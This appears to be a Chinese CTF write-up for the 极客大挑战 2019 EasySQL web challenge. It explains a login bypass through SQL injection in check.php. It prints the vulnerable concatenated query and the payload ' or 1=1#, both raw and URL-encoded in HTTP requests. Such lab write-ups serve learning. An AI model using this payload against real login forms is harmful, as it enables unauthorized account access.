---
title: 极客大挑战 2019 - Web - EasySQL
date: 2026-11-14 18:30:00
categories:
  - CTF
  - 极客大挑战 2019
  - Web
tags:
  - SQL 注入
  - 万能密码
  - 认证绕过
cover: /img/cover/petal-smiley-faces.jpg
description: 极客大挑战 2019 的 SQL 注入签到题，登录表单把 GET 参数直接拼进查询且无过滤。用单引号闭合 password 字段、or 1=1 令条件恒真、井号注释掉剩余语句，即可以万能密码绕过登录并拿到 flag。
keywords:
  - SQL 注入
  - 万能密码
  - 登录绕过
  - check.php
  - CTF
ai: >-
  本题是极客大挑战 2019 的 Web 签到题 EasySQL，考察最基础的 SQL 注入认证绕过。首页是一个提交到 check.php 的 GET 登录表单，含 username 与 password 两个参数。正常登录返回错误提示，而后端把用户输入直接拼接进形如按用户名和密码筛选的查询，未做任何转义或过滤。利用时以单引号闭合 password 字符串，再拼接恒真条件使整个 WHERE 子句成立，最后用注释符截断后续 SQL，即可在不知道口令的情况下通过校验。登录成功后页面直接显示 flag。难点极低，主要用于让选手熟悉注入点定位、引号闭合与注释符这三个基本动作。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | 极客大挑战 2019 |
| 方向 | Web |
| 难度 | Easy |
| 环境 | 授权靶场（已脱敏） |

## 信息收集

访问首页是一个登录表单，提交到 `check.php`，参数为 `username` 和 `password`（GET 方式）。

```html
<form action="check.php" method="GET">
    <input type="text" name="username" />
    <input type="text" name="password" />
</form>
```

正常登录测试：

```http
GET /check.php?username=admin&password=*** HTTP/1.1
Host: target:8080
```

返回：`NO,Wrong username password！！！`

友好 ID、求解人数等平台标识已脱敏。

## 漏洞分析

漏洞类型：SQL 注入（万能密码 / 逻辑绕过）。

后端 SQL 查询大致为：

```sql
SELECT * FROM users WHERE username='$username' AND password='$password'
```

后端将用户输入直接拼接进 SQL 查询，未做过滤。

## 利用过程

使用万能密码绕过。构造后 SQL 变为：

```sql
SELECT * FROM users WHERE username='admin' AND password='' or 1=1#'
```

`or 1=1` 恒真，`#` 注释掉后面内容，成功绕过登录。返回 `Login Success!` 并显示 flag。

```http
GET /check.php?username=admin&password=%27%20or%201%3D1%23 HTTP/1.1
Host: target:8080
```

## 完整 EXP

最终 payload（未编码）：

```text
username=admin&password=' or 1=1#
```

URL 编码后的请求：

```http
GET /check.php?username=admin&password=%27%20or%201%3D1%23 HTTP/1.1
Host: target:8080
```

## Flag

```text
flag{xxxx}
```

（登录成功后页面显示，真实值已脱敏。）

## 踩坑与总结

1. 后端将用户输入直接拼接进 SQL 查询，未做过滤 —— 注入根因。
2. 单引号闭合 password 字段，`or 1=1` 使条件恒真。
3. `#` 注释掉剩余 SQL 语句，实现认证绕过。
4. 注意该题为 GET 传参，构造时需对引号、空格与 `#` 做 URL 编码。
